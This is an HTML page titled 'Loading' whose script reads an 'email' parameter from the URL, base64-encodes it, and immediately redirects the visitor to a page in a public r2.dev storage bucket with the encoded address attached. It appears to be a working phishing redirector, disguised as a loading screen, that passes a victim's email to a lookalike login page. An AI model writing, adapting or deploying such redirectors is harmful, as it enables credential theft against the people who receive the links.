<!DOCTYPE html>
<html>
  <head>
    <title>Loading</title>
  </head>
  <body>
    <script>
      // Get the email parameter from the URL
      const urlParams = new URLSearchParams(window.location.search);
      const email = urlParams.get("email");

      // Encode the email parameter in base64
      const encodedEmail = btoa(email);

      // Redirect to the specified URL with the encoded email parameter
      window.location.href = `https://pub-f5334eb9fe594187b59fc551683d1081.r2.dev/index.html#${encodeURIComponent(encodedEmail)}`;
    </script>
  </body>
</html>
